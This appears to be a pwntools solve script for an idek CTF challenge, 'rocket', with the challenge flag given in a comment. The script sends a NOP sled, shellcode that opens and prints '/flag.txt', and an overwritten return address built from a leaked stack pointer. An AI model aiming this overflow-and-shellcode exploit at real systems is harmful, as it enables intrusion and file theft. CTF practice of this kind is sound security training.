# idek{iamgroot_i_am_groot_I_AM_GROOOOT}
from pwn import *

elf = ELF("./rocket")

context.binary = elf

target =  elf.process()
target = remote("gotg.chal.idek.team", 1337)

target.recvline()
target.recvuntil(":")
leak = int(target.recvline().strip(), 0x10)

#gdb.attach(target, 'c\n' + 'si\n'*11)
fd = 3

shellcode = '''
mov rdi, 0
mov rsi, rsp
sub rsi, 0x80
mov rdx, 0x80
mov rax, 0
syscall

mov rdi, ''' + str(fd) + '''
mov rdx, 0
mov r10, 0
mov r8, 0
mov rax, 257
syscall

mov rdi, ''' + str(fd) + '''
mov rdx, 0x80
mov rax, 0
syscall

mov rdi, 1
mov rax, 1
syscall
'''
payload = "\x90"*0x100 + asm(shellcode)
payload += "\x00"*(0x800 - len(payload))
payload += p64(leak)*0x40
target.sendline(payload)

target.sendline("/flag.txt\x00")

target.interactive()